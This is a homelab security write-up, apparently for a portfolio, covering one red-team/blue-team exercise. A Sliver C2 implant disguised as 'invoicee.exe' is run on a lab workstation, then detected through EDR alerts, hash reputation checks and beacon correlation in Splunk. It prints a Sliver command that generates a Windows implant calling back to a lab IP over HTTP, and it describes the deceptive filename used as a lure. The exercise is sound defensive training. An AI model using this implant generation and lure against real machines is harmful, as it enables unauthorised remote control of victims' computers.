# Phase 1: Initial Access & Execution Analysis

## Project Overview

**Scenario:** Initial Access via User Execution  
**Perspective:** Red Team Simulation & Blue Team Detection  
**Environment:** Homelab SOC Simulation  

**Tools Used**
- **Sliver** — Command & Control (Attacker)
- **Splunk** — SIEM
- **LimaCharlie** — Endpoint Detection & Response (EDR)

---

## 1. Executive Summary

This phase simulates an adversary gaining an initial foothold within the environment through **user-assisted execution**.

A malicious Windows payload named **`invoicee.exe`** was delivered to a victim workstation. The user manually executed the file, resulting in the establishment of a **Command & Control (C2)** channel back to the attacker infrastructure.

### Objectives
- Detect execution of an **unsigned binary**
- Identify **C2 beaconing activity**
- Correlate endpoint and network telemetry
- Assess analyst decision-making

---

## 2. Attack Simulation (Red Team)

### Tooling
**C2 Framework:** Sliver

### Payload Generation
```bash
generate --http 192.168.1.101:80 --save /opt/invoicee.exe --os windows
```

A malicious payload named **`invoicee.exe`** was generated and saved to `/opt/invoicee.exe`.

The filename was intentionally chosen to appear legitimate and familiar, increasing the likelihood of successful user execution through **social engineering**.

### Delivery Method
- Manual drag-and-drop into the victim’s **Downloads** folder

### Execution
- User manually double-clicked the file
- No exploitation or lateral movement was used

---

## 3. Technical Analysis (Blue Team)

### Step 1: Process Execution Detection

#### Observation

LimaCharlie EDR generated alerts indicating suspicious activity on the host:

- **Hostname:** `fadhli-pc.redgunn.local`
- Execution of an unsigned binary
- Execution path within the **Downloads** directory
- YARA detections in memory

The process tree shows:

- **Parent Process:** `explorer.exe`
- **Child Process:** `invoicee.exe`

This strongly indicates **manual user execution**, rather than execution via service-based lateral movement (e.g., `services.exe`, `wmiprvse.exe`).

#### Evidence Collected
- **File Path:**  
  ```
  C:\Users\FADWIN10\Downloads\invoicee.exe
  ```

---

### Step 2: File Hash Investigation (Threat Intelligence)

#### Action

The SOC analyst extracted the SHA256 hash from LimaCharlie telemetry and performed reputation analysis.

#### Artifacts
- **File Path:**  
  ```
  C:\Users\FADWIN10\Downloads\invoicee.exe
  ```
- **SHA256 Hash:**  
  ```
  019b1291301dcf37569e80f7db6848c42b76d0b12196609965090d69e471d968
  ```
- **Signer:** Unsigned / Unknown Publisher

#### Initial VirusTotal Check
- **Result:** 0 detections
- **Assessment:** No existing global reputation

**Analyst Assessment:**  
A zero-detection binary appearing in the user Downloads directory is classified as **highly suspicious** and indicative of:
- Custom-compiled malware
- Targeted payload
- Polymorphic or new dropper

#### Secondary VirusTotal Submission

The binary was manually uploaded to VirusTotal for deeper inspection.

- **Result:** CRITICAL  
- **Detection Rate:** 58 / 70 vendors
- **Classifications:**
  - Trojan.Generic
  - Malware.Heuristic
  - EICAR-Test-Signature

**Analyst Conclusion:**  
The file is confirmed malicious with high confidence.

**Decision:** Escalate to containment.

- **Indicator Type:** Atomic Indicator  
- **Indicator Value:** Known Bad Hash

---

### Step 3: Network Beaconing & C2 Correlation

#### Observation

Immediately after execution, the process initiated outbound network communication.

- **Destination IP:** `192.168.1.101`
- **Port:** `80 (HTTP)`
- **Pattern:** Repeated outbound connections (beaconing)

This activity was observed through:
- LimaCharlie EDR network telemetry
- Splunk correlation logs

#### Analyst Assessment

The consistent outbound pattern strongly matches **C2 beacon behavior**, confirming successful attacker communication.

---

## 4. Detection Logic

### 4.1 LimaCharlie EDR Rule

The following Detection & Response logic triggers on:

- Unsigned binaries
- Executed from user-writable directories
- Establishing outbound internet connections

*(Rule logic intentionally omitted for brevity / OPSEC)*

---

## 5. Containment & Lessons Learned

### Containment Status: **Delayed**

**Reasoning:**  
The infected host was deliberately left active to observe:

- Phase 2 — Privilege Escalation
- Phase 3 — Persistence mechanisms

### Real-World Scenario

In a production environment:
- The endpoint would be **immediately isolated**
- Network communication would be blocked
- Memory and disk artifacts preserved for forensics

This phase demonstrates the importance of:
- User-executed malware detection
- Correlating endpoint and network telemetry
- Recognizing zero-reputation binaries as high-risk indicators

---

## Phase Outcome

✅ Initial access detected  
✅ Malicious execution confirmed  
✅ C2 beacon identified  
✅ Indicators extracted for future detection  

**Next Phase:** Privilege Escalation
